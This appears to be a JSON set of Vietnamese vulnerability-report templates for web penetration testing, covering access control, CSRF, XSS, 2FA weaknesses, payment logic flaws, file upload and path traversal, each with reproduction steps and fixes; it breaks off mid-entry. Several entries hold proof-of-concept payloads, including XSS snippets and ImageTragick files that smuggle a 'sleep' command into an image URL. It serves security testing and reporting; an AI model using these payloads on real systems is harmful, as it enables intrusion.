[{
  "_id": 1,
  "category": "Broken Access Control (BAC)",
  "subcategory": "Insecure Direct Object References (IDOR)",
  "name": "IDOR",
  "type": "Toàn bộ chức năng",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) không kiểm tra kỹ phân quyền, cho phép attacker truy xuất/chỉnh sửa thông tin của người dùng khác, thông qua việc thay đổi giá trị của tham số `PARAM_NAME`.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt request gửi đến `URL`, sau đó thay đổi trường `PARAM_NAME` thành một giá trị thuộc phân quyền của người dùng khác (ví dụ `PARAM_VALUE`). Cuối cùng, chuyển tiếp request.\n4. <Nêu kết quả>",
  "solution": "Đảm bảo rằng mỗi người dùng chỉ có thể truy xuất/chỉnh sửa thông tin thuộc về người dùng đó.",
  "note": "",
  "createAt": "2021-04-13T10:21:53",
  "updateAt": "2021-11-30T15:48:36"
},{
  "_id": 2,
  "category": "Broken Access Control (BAC)",
  "name": "Missing Function Level Access Control",
  "type": "Toàn bộ chức năng",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) không kiểm tra phân quyền, cho phép attacker truy xuất/chỉnh sửa thông tin mà không cần đăng nhập.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Truy cập `URL`.\n2. <Nêu kết quả>",
  "solution": "Đảm bảo xác thực phân quyền đối với các chức năng liên quan đến dữ liệu riêng tư.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:49:47"
},{
  "_id": 3,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Privilege Escalation",
  "name": "Privilege escalation",
  "type": "Toàn bộ chức năng",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) không kiểm tra kỹ phân quyền, cho phép attacker sử dụng chức năng không được cấp quyền.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. Đăng nhập vào tài khoản `USER_A` có quyền truy cập chức năng `FUNCTION_NAME`.\n3. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n4. Trong phần mềm proxy, bắt request gửi đến `URL` và lưu lại request này.\n5. Đăng nhập vào tài khoản `USER_B` không có quyền truy cập chức năng `FUNCTION_NAME`.\n6. Chỉnh sửa request đã lưu ở bước 4 để chuyển phiên từ tài khoản `USER_A` sang tài khoản `USER_B`:\n\n    - <Nêu rõ cần đổi những trường gì của request, thường là chỉ cần đổi Cookie>\n7. Gửi request đã được chỉnh sửa.",
  "solution": "Đảm bảo rằng mỗi người dùng chỉ có thể sử dụng các chức năng mà họ đã được phân quyền.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:50:38"
},{
  "_id": 4,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Privilege Escalation",
  "name": "Privilege escalation",
  "type": "Toàn bộ chức năng",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) không kiểm tra kỹ phân quyền, cho phép attacker sử dụng chức năng không được cấp quyền.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. Đăng nhập vào tài khoản `USER_A` không có quyền truy cập chức năng `FUNCTION_NAME`.\n2. Truy cập `URL`.\n3. <Nêu kết quả>",
  "solution": "Đảm bảo rằng mỗi người dùng chỉ có thể sử dụng các chức năng mà họ đã được phân quyền.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:51:26"
},{
  "_id": 5,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "Không có CSRF token",
  "type": "Toàn bộ chức năng",
  "description": "Lỗi CSRF ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "Thực hiện các bước sau trên trình duyệt `<tên trình duyệt>`:\n\n1. Đăng nhập ứng dụng.\n2. Tạo file `poc.html` với nội dung sau:\n\n    ```html\n    <Nội dung file>\n    ```\n\n3. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập ứng dụng.\n4. <Nêu kết quả>",
  "solution": "Bổ sung cơ chế chống tấn công CSRF, ví dụ như sử dụng CSRF token.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:52:03"
},{
  "_id": 6,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "Có CSRF token nhưng server không kiểm tra / chỉ kiểm tra độ dài",
  "type": "Toàn bộ chức năng",
  "description": "Lỗi CSRF ở chức năng `FUNCTION_NAME` (`URL`) do server kiểm tra CSRF token không đầy đủ, cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "Thực hiện các bước sau trên trình duyệt `<tên trình duyệt>`:\n\n1. Đăng nhập ứng dụng.\n2. Tạo file `poc.html` với nội dung sau:\n\n    ```html\n    <Nội dung file>\n    ```\n\n3. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập ứng dụng.\n4. <Nêu kết quả>",
  "solution": "Đảm bảo CSRF token được kiểm tra đúng.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:52:20"
},{
  "_id": 7,
  "category": "Cross-Site Request Forgery (CSRF)",
  "name": "Có CSRF token nhưng dùng chung được giữa các user",
  "type": "Toàn bộ chức năng",
  "description": "Lỗi CSRF ở chức năng `FUNCTION_NAME` (`URL`) do CSRF token có thể dùng chung giữa các user, cho phép attacker giả mạo thao tác của nạn nhân trên ứng dụng.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "Thực hiện các bước sau trên trình duyệt `<tên trình duyệt>`:\n\n1. Đăng nhập vào tài khoản `USER_A`.\n2. <Nêu cách lấy CSRF token của `USER_A`, có thể từ source HTML, từ cookie, ...).\n3. Mở một trình duyệt khác, đăng nhập vào tài khoản `USER_B`.\n4. Tạo file `poc.html` với nội dung sau:\n\n    ```html\n    <Nội dung file, có ghi rõ nơi chứa token của USER_A>\n    ```\n\n5. Mở file `poc.html` trong cùng trình duyệt đang đăng nhập tài khoản `USER_B`.\n6. <Nêu kết quả>",
  "solution": "Đảm bảo CSRF token chỉ có hiệu lực theo từng user.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:52:32"
},{
  "_id": 8,
  "category": "Other",
  "name": "Mass assignment",
  "type": "Toàn bộ chức năng",
  "description": "Lỗi Mass Assignment ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker chỉnh sửa thông tin không thuộc logic hoạt động bình thường của ứng dụng. <Nêu ảnh hưởng khác nếu có>",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. Đăng nhập ứng dụng.\n3. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n4. Trong phần mềm proxy, bắt request gửi đến `URL`, sau đó bổ sung thêm trường `PARAM_NAME` với giá trị là `PARAM_VALUE` và chuyển tiếp request. Ví dụ request trước và sau khi đổi như sau:\n\n    Request gốc\n    \n    ```\n    Thông thường chỉ cần paste dòng đầu tiên (chứa URL) và body của request (có thể bỏ bớt body nếu quá dài).\n    ```\n\n    Request sau khi thay đổi\n\n    ```\n    Thông thường chỉ cần paste dòng đầu tiên (chứa URL) và body của request (có thể bỏ bớt body nếu quá dài).\n    ```\n\n5. <Nêu kết quả>",
  "solution": "Với dữ liệu do người dùng gửi lên, chỉ sử dụng những trường dữ liệu đã quy định sẵn.",
  "note": "",
  "createAt": "2021-04-13T10:21:55",
  "updateAt": "2021-11-30T15:53:56"
},{
  "_id": 10,
  "category": "Cross-Site Scripting (XSS)",
  "subcategory": "Stored",
  "name": "Stored XSS",
  "type": "Toàn bộ chức năng",
  "description": "Lỗi Stored XSS ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker thực thi code Javascript trên máy nạn nhân.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Đăng nhập vào tài khoản `USER_A`.\n2. <Nêu các bước dẫn đến việc payload XSS được lưu lại>\n3. Đăng nhập vài tài khoản `USER_B`.\n4. <Nêu các bước dẫn đến việc payload XSS được thực thi>",
  "solution": "Xử lý dữ liệu an toàn trước khi in ra HTML.",
  "note": "1. Thấp (nếu là user quyền cao tấn công user quyền thấp)\n2. Trung bình (nếu là user quyền cao tấn công user quyền cao hơn)\n3. Cao (nếu là user quyền thấp tấn công user quyền cao)",
  "createAt": "2021-04-13T10:21:56",
  "updateAt": "2021-11-30T15:54:32"
},{
  "_id": 11,
  "category": "Server-Side Injection",
  "subcategory": "Content Spoofing",
  "name": "Có thể thay đổi được tiêu đề/nội dung email/SMS",
  "type": "Gửi Email/SMS",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) dẫn đến việc gửi email/SMS tới người dùng, với tiêu đề/nội dung của email/SMS có thể được thay đổi tùy ý. Attacker có thể lợi dụng điều này để thực hiện tấn công lừa đảo.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt request gửi đến `URL`, sau đó thay đổi trường `PARAM_NAME` thành `PARAM_VALUE`. Cuối cùng, chuyển tiếp request.\n3. Email/SMS có tiêu đề/nội dung sau được gửi đến người nhận:\n\n    ```\n    <Nội dung email/SMS>\n    ```",
  "solution": "Không cho phép can thiệp vào tiêu đề/nội dung của email/SMS. \n\nNếu thiết kế chức năng của ứng dụng bắt buộc email/SMS phải chứa thông tin từ người dùng gửi lên (ví dụ thông báo khi có tin nhắn cá nhân mới), cần đảm bảo nội dung của emai/SMS không thể gây ra hiểu nhầm ở phía người nhận.",
  "note": "",
  "createAt": "2021-04-13T10:21:56",
  "updateAt": "2021-11-30T15:56:08"
},{
  "_id": 12,
  "category": "Server-Side Injection",
  "subcategory": "Server-Side Template Injection (SSTI)",
  "name": "Template injection",
  "type": "Gửi Email/SMS",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) dẫn đến việc gửi email/SMS tới người dùng, với tiêu đề/nội dung của email/SMS có thể bị attacker lợi dụng để thực thi lệnh tùy ý phía server, thông qua lỗi Template Injection.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt request gửi đến `URL`, sau đó thay đổi trường `PARAM_NAME` thành `PARAM_VALUE`. Cuối cùng, chuyển tiếp request.\n4. <Nêu kết quả chứng tỏ rằng đã xảy ra lỗi Template Injection>",
  "solution": "Chỉ coi những dữ liệu do người dùng kiểm soát là văn bản thuần, không thực hiện render các dữ liệu này.",
  "note": "",
  "createAt": "2021-04-13T10:21:56",
  "updateAt": "2021-11-30T15:56:56"
},{
  "_id": 13,
  "category": "Server Security Misconfiguration",
  "subcategory": "No Rate Limiting on Form",
  "variant": "Email-Triggering",
  "name": "Không có rate-limiting",
  "type": "Gửi Email/SMS",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) dẫn đến việc gửi SMS tới người dùng. Do không có cơ chế giới hạn, attacker có thể gửi số lượng SMS tùy ý, gây tốn kém chi phí cho ứng dụng.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n2. Ứng dụng gửi SMS đến số điện thoại của người dùng.\n3. Lặp lại các bước trên 10 lần (có thể sử dụng công cụ hỗ trợ như Intruder của Burp Suite).\n4. Nhận được 10 SMS từ ứng dụng.",
  "solution": "Có cơ chế giới hạn việc gửi SMS trong một khoảng thời gian.",
  "note": "",
  "createAt": "2021-04-13T10:21:56",
  "updateAt": "2021-11-30T15:57:29"
},{
  "_id": 14,
  "category": "Server Security Misconfiguration",
  "subcategory": "No Rate Limiting on Form",
  "name": "Bruteforce OTP",
  "type": "2FA",
  "description": "Chức năng Xác thực 2FA (URL) không có giới hạn số lần nhập OTP. Attacker có thể thử đến khi tìm được mã chính xác.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Bật xác thực 2FA.\n2. Đăng nhập ứng dụng, xác thực 2FA bằng OTP không chính xác. Lặp lại 10 lần thao tác này.\n3. Xác thực 2FA bằng OTP chính xác.",
  "solution": "Khóa tài khoản sau 10 lần nhập sai OTP liên tiếp (do đây là dấu hiệu cho thấy tài khoản đã bị hack).",
  "note": "",
  "createAt": "2021-04-13T10:21:56",
  "updateAt": "2021-11-30T15:58:14"
},{
  "_id": 15,
  "category": "Insufficient Security Configurability",
  "subcategory": "Weak 2FA Implementation",
  "name": "OTP có thể dùng lại sau khi đã sử dụng",
  "type": "2FA",
  "description": "Chức năng Xác thực 2FA (`URL`) cho phép dùng lại OTP đã được sử dụng trước đó. Điều này gây ra rủi ro cho người dùng trong trường hợp để lộ OTP cũ.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Bật xác thực 2FA.\n2. Đăng nhập ứng dụng, xác thực 2FA.\n3. Đăng xuất và đăng nhập lại ứng dụng, xác thực 2FA bằng OTP đã dùng ở bước 2.",
  "solution": "Vô hiệu hóa OTP ngay sau khi được sử dụng thành công.",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T15:58:59"
},{
  "_id": 16,
  "category": "Insufficient Security Configurability",
  "subcategory": "Weak 2FA Implementation",
  "name": "OTP có thể sử dụng sau khi đã request OTP mới",
  "type": "2FA",
  "description": "Chức năng Xác thực 2FA (`URL`) cho phép dùng lại các OTP cũ sau khi đã sinh OTP mới. Điều này tăng xác suất tìm ra OTP đúng cho attacker (do ở một thời điểm có nhiều OTP hợp lệ).",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Bật xác thực 2FA.\n2. Đăng nhập ứng dụng, ở bước xác thực 2FA, lưu lại OTP.\n3. Đăng nhập lại ứng dụng và yêu cầu cấp OTP mới.\n4. Xác thực 2FA bằng OTP đã lưu ở bước 2.",
  "solution": "Vô hiệu hóa các OTP cũ sau khi sinh OTP mới.",
  "note": "Chức năng Xác thực 2FA (`URL`) cho phép dùng lại các OTP cũ sau khi đã sinh OTP mới. Điều này tăng xác suất tìm ra OTP đúng cho attacker (do ở một thời điểm có nhiều OTP hợp lệ).",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T15:59:21"
},{
  "_id": 17,
  "category": "Broken Authentication and Session Management",
  "subcategory": "Authentication Bypass",
  "name": "Force Browsing",
  "type": "2FA",
  "description": "Chức năng Xác thực 2FA (`URL`) hoạt động không chính xác. Attacker có thể truy cập các chức năng của ứng dụng dù chưa hoàn thành xác thực 2FA.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Bật xác thực 2FA.\n2. Đăng nhập ứng dụng, dừng ở bước yêu cầu xác thực 2FA.\n3. Truy cập `URL`.\n4. Ứng dụng vẫn cho phép truy cập dù chưa hoàn thành xác thực 2FA.",
  "solution": "Đảm bảo các chức năng của ứng dụng chỉ có thể được truy cập sau khi người dùng đã hoàn thành xác thực 2FA.",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:00:04"
},{
  "_id": 18,
  "category": "Other",
  "name": "Giao dịch với số âm",
  "type": "Tài chính",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) cho phép thực hiện giao dịch với số âm, dẫn đến <nêu ảnh hưởng>",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt request gửi đến `URL`, sau đó thay đổi trường `PARAM_NAME` thành `PARAM_VALUE`. Cuối cùng, chuyển tiếp request.\n4. <Nêu kết quả>",
  "solution": "Chỉ cho phép sử dụng số dương với giá trị giao dịch.",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:01:26"
},{
  "_id": 19,
  "category": "Other",
  "name": "Race condition",
  "type": "Tài chính",
  "description": "Lỗi Race Condition ở chức năng `FUNCTION_NAME` (`URL`) cho phép attacker <nêu ảnh hưởng>",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt HTTP request đến `URL2` này và không thực hiện chuyển tiếp (request không được gửi lên server).\n4. Sử dụng chức năng Intruder của Burp Suite, hoặc các công cụ tương tự để gửi request vừa bắt được trong 10 luồng chạy song song (các request được gửi cùng lúc).\n5. <Nêu kết quả>",
  "solution": "Đảm bảo các chức năng nhạy cảm được xử lý đúng khi chạy đa luồng.",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:01:46"
},{
  "_id": 20,
  "category": "Other",
  "name": "Lỗi làm tròn số",
  "type": "Tài chính",
  "description": "",
  "impact": "",
  "severity": "INFO",
  "reproduce": "",
  "solution": "",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:01:59"
},{
  "_id": 21,
  "category": "Other",
  "name": "Lợi dụng tỉ giá giữa các đơn vị tiền tệ",
  "type": "Tài chính",
  "description": "",
  "impact": "",
  "severity": "INFO",
  "reproduce": "",
  "solution": "",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:04:14"
},{
  "_id": 22,
  "category": "Other",
  "name": "Giá trị giao dịch có thể bị chỉnh sửa",
  "type": "Tài chính",
  "description": "Trong quá trình thực hiện chức năng `FUNCTION_NAME` (`URL`), ứng dụng gửi request đến `URL2` có chứa giá trị giao dịch. Bằng cách chỉnh sửa giá trị này, attacker có thể thay đổi số tiền bị trừ, gây thất thoát tài chính cho ứng dụng.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n3. Trong phần mềm proxy, bắt HTTP request đến `URL2`, sau đó thay đổi trường `PARAM_NAME` thành một giá trị khác nhỏ hơn giá trị gốc. Cuối cùng, chuyển tiếp request.\n4. <Nêu kết quả>",
  "solution": "Kiểm tra kỹ giá trị do người dùng gửi lên và đảm bảo giá trị liên quan đến giao dịch được thống nhất trong toàn bộ luồng hoạt động của chức năng.",
  "note": "",
  "createAt": "2021-04-13T10:21:57",
  "updateAt": "2021-11-30T16:04:32"
},{
  "_id": 23,
  "category": "Other",
  "name": "Ứng dụng chấp nhận thẻ Test",
  "type": "Tài chính",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) chấp nhận thẻ Test từ `https://developer.paypal.com/docs/payflow/payflow-pro/payflow-pro-testing/#credit-card-numbers-for-testing`. Attacker có thể thực hiện giao dịch mà không mất tiền.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "<Các bước dẫn đến chức năng bị lỗi phụ thuộc vào ứng dụng>\n1. Sử dụng thẻ Test được cung cấp tại `https://developer.paypal.com/docs/payflow/payflow-pro/payflow-pro-testing/#credit-card-numbers-for-testing`, cụ thể:\n- Loại thẻ: `MasterCard`\n- Số thẻ: `2221000000000009`\n- Hạn sử dụng: Bất kỳ\n- CVV: Bất kỳ\n2. Ứng dụng chấp nhận thẻ test.",
  "solution": "Không chấp nhận thẻ test trong môi trường chạy thật.",
  "note": "",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:04:40"
},{
  "_id": 24,
  "category": "Insufficient Security Configurability",
  "subcategory": "Weak Password Policy",
  "name": "Câu hỏi bảo mật yếu",
  "type": "Quên mật khẩu",
  "description": "Chức năng `Quên mật khẩu` (`URL`) có sử dụng câu hỏi bảo mật như một yếu tố để khôi phục mật khẩu. Một số câu hỏi bảo mật được cung cấp bởi ứng dụng có độ khó thấp (dễ dàng tra cứu, hoặc không có nhiều lựa chọn), cho phép attacker có thể dò tìm ra câu trả lời đúng và chiếm quyền tài khoản nạn nhân.",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Đăng nhập tài khoản.\n2. Truy cập URL để thiết lập câu hỏi bảo mật.\n3. Ứng dụng cung cấp một số câu hỏi bảo mật có độ khó thấp, cụ thể:\n\n    3.1. <Câu hỏi 1>\n\n    3.2. <Câu hỏi 2>",
  "solution": "Sử dụng các câu hỏi bảo mật có độ khó cao, (ví dụ `Tên con vật thứ hai mà bạn nuôi`, `Buổi hẹn hò đầu tiên của bạn diễn ra ở đâu`), hoặc cho người dùng tự nhập câu hỏi.",
  "note": "- Trung bình nếu chỉ cần câu hỏi bảo mật để reset mật khẩu.\n- Thấp nếu yêu cầu thêm các điều kiện khác (ví dụ mã xác nhận gửi qua email).",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:05:20"
},{
  "_id": 25,
  "category": "Broken Cryptography",
  "subcategory": "Cryptographic Flaw",
  "name": "Password cũ được gửi đến email",
  "type": "Quên mật khẩu",
  "description": "Chức năng `Quên mật khẩu` (`URL`) gửi mật khẩu hiện tại đến email người dùng dưới dạng plaintext. Điều này chứng tỏ rằng mật khẩu được lưu trong CSDL ở dạng không an toàn. Khi có sự cố xảy ra, toàn bộ mật khẩu của người dùng sẽ bị lộ.",
  "impact": "",
  "severity": "MEDIUM",
  "reproduce": "1. Truy cập URL để tiến hành khôi phục mật khẩu.\n2. Kiểm tra email thay đổi mật khẩu được gửi từ ứng dụng, nhận thấy mật khẩu cũ (trước khi đổi) được gửi ở dạng plaintext.",
  "solution": "Lưu trữ mật khẩu ở dạng an toàn trong CSDL, ví dụ bcrypt.",
  "note": "",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:06:18"
},{
  "_id": 26,
  "category": "Server-Side Injection",
  "subcategory": "Content Spoofing",
  "name": "Host header attack",
  "type": "Quên mật khẩu",
  "description": "Chức năng `Quên mật khẩu` (`URL`) sử dụng header Host của HTTP request để tạo URL cho phép người dùng thay đổi mật khẩu. Bằng cách đặt header Host là một domain do mình kiểm soát, attacker có thể lấy được URL thay đổi mật khẩu khi được truy cập bởi người dùng.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. Truy cập URL để tiến hành khôi phục mật khẩu.\n3. Trong phần mềm proxy, bắt request gửi đến URL, sau đó thay đổi header Host thành `www.google.com` và chuyển tiếp request. \n4. Kiểm tra email thay đổi mật khẩu được gửi từ ứng dụng, nhận thấy domain của URL là `www.google.com`.",
  "solution": "Không dùng header Host của HTTP request để tạo URL thay đổi mật khẩu.",
  "note": "",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:07:05"
},{
  "_id": 27,
  "category": "Cross-Site Scripting (XSS)",
  "subcategory": "Stored",
  "name": "Stored XSS qua filename",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) không xử lý tên file do người dùng upload trước khi in ra HTML. Attacker có thể upload file có tên chứa mã khai thác để thực hiện tấn công XSS.",
  "impact": "",
  "severity": "HIGH",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng upload file>\n3. Upload file bất kỳ.\n4. Trong phần mềm proxy, bắt request gửi đến URL, sau đó thay đổi tên file vừa upload thành `<img src onerror=alert(origin) >` và chuyển tiếp request. \n5. <Các bước dẫn đến việc hiển thị tên file>",
  "solution": "Xử lý tên file trước khi in ra HTML.",
  "note": "- Thấp (nếu là user quyền cao tấn công user quyền thấp)\n- Trung bình (nếu là user quyền cao tấn công user quyền cao hơn)\n- Cao (nếu là user quyền thấp tấn công user quyền cao)",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:08:11"
},{
  "_id": 28,
  "category": "Cross-Site Scripting (XSS)",
  "subcategory": "Stored",
  "name": "Stored XSS qua việc upload file",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) cho phép upload file `.html`/`.htm`/`.svg`. Attacker có thể upload file chứa mã khai thác để thực hiện tấn công XSS khi người dùng mở file.",
  "impact": "",
  "severity": "INFO",
  "reproduce": "1. <Các bước dẫn đến chức năng upload file>\n2. Upload file `poc.html`/`poc.htm`/`poc.svg` có nội dung sau:\n\n    ```html\n    <img src=x onerror=alert(origin) />\n    ```\n\n    (nếu là file `.html`/`.htm`, hoặc)\n\n    ```svg\n    <svg xmlns=\"http://www.w3.org/2000/svg\">\n       <script type=\"text/javascript\">\n          alert(origin);\n       </script>\n    </svg>\n    ```\n\n    (nếu là file `.svg`)\n\n3. Mở file vừa upload (có dạng `URL2`), mã tấn công sẽ được thực thi.",
  "solution": "Chỉ có phép upload các định dạng file an toàn, phụ thuộc vào yêu cầu chức năng của ứng dụng.",
  "note": "- Thấp (nếu là user quyền cao tấn công user quyền thấp)\n- Trung bình (nếu là user quyền cao tấn công user quyền cao hơn)\n- Cao (nếu là user quyền thấp tấn công user quyền cao)",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:08:41"
},{
  "_id": 29,
  "category": "Server Security Misconfiguration",
  "subcategory": "Unsafe File Upload",
  "name": "RCE qua việc upload web shell ",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) cho phép upload file `.<phần mở rộng>`. Attacker có thể upload file chứa mã khai thác để thực thi lệnh trên server.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. <Các bước dẫn đến chức năng upload file>\n2. Upload file `poc.<phần mở rộng>` có nội dung sau:\n\n    ```\n    Nội dung file web shell (liên hệ QA)\n    ```\n\n3. Mở file vừa upload (có dạng `URL2`), <nêu kết quả>.",
  "solution": "Chỉ cho phép upload các định dạng file an toàn, phụ thuộc vào yêu cầu chức năng của ứng dụng.",
  "note": "",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:10:00"
},{
  "_id": 30,
  "category": "Server Security Misconfiguration",
  "subcategory": "Path Traversal",
  "name": "Path Traversal",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) cho phép attacker thay đổi tham số `PARAM_NAME` để <nêu hậu quả, ví dụ download file bất kỳ trên server>.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. Thiết lập trình duyệt cho đi qua một phần mềm proxy (ví dụ Burp Suite).\n2. <Các bước dẫn đến chức năng bị lỗi>\n3. Trong phần mềm proxy, bắt request gửi đến URL, sau đó thay đổi trường `PARAM_NAME` thành `PARAM_VALUE`. Cuối cùng, chuyển tiếp request.\n4. <Nêu kết quả>",
  "solution": "Không sử dụng dữ liệu do người dùng kiểm soát để tạo đường dẫn của file, hoặc chỉ cho phép xử lý các file đã được quy định trước (ví dụ theo thư mục).",
  "note": "- Nghiêm trọng nếu dẫn đến RCE/đọc file trên server.\n- Liên hệ QA trong các trường hợp khác.",
  "createAt": "2021-04-13T10:21:58",
  "updateAt": "2021-11-30T16:10:33"
},{
  "_id": 31,
  "category": "Server-Side Injection",
  "subcategory": "Remote Code Execution (RCE)",
  "name": "RCE qua ImageTragick",
  "type": "Xử lý file",
  "description": "Chức năng `FUNCTION_NAME` (`URL`) sử dụng thư viện ImageMagick phiên bản cũ để xử lý file ảnh do người dùng upload, tồn tại lỗi cho phép attacker thực thi lệnh trên server.",
  "impact": "",
  "severity": "CRITICAL",
  "reproduce": "1. <Các bước dẫn đến chức năng upload file phụ thuộc vào ứng dụng>\n2. Upload file `image1.jpg` có nội dung sau (có thể tạo file ở dạng `.txt` sau đó đổi phần mở rộng thành `.jpg`):\n\n    ```\n    push graphic-context\n    viewbox 0 0 640 480\n    fill 'url(https://example.com/image.jpg\"|sleep 5\")'\n    pop graphic-context\n    ```\n\n3. Nhận thấy ứng dụng mất hơn 5 giây để xử lý request (do kết quả của câu lệnh `sleep 5`).\n4. Upload file `image2.jpg` có nội dung sau (có thể tạo file ở dạng `.txt` sau đó đổi phần mở rộng thành `.jpg`):\n\n    ```\n    push graphic-context\n    viewbox 0 0 640 480\n    fill 'url(https://example.com/image.jpg\"|sleep 0\")'\n    pop graphic-context\n    ```\n\n5. Nhận thấy ứng dụng mất dưới 5 giây để xử lý request (do kết quả của câu lệnh `sleep 0`).",
  "solution": "Cập nhật ImageMagick lên phiên bản mới nhất.",
  "note": "",
  "createAt": "2021-04-13T10:21:59",
  "updateAt": "2021-11-30T16:10:56"
},{
  "_id": 33,
  "category": "Unvalidated Redirects and Forwards",
  "subcategory": "Open Redirect",
  "name": "Open redirect",
  "type": "Đăng nhập",
  "description": "Lỗi Open Redirect ở chức năng `Đăng nhập` (`URL`), cho phép attacker điều hướng nạn nhân đến website khác có nội dung độc hại (ví dụ website với giao diện giả mạo yêu cầu người dùng điền lại thông tin đăng nhập để đánh cắp)",
  "impact": "",
  "severity": "LOW",
  "reproduce": "1. Truy cập `URL`.\n2. Thực hiện đăng nhập.\n3. Sau khi đăng nhập thành công, trình duyệt sẽ redirect sang địa chỉ `https://google.com`.",
  "solution": "Chỉ cho phép redirect về các URL thuộc domain của ứng dụng.",
  "note": "",
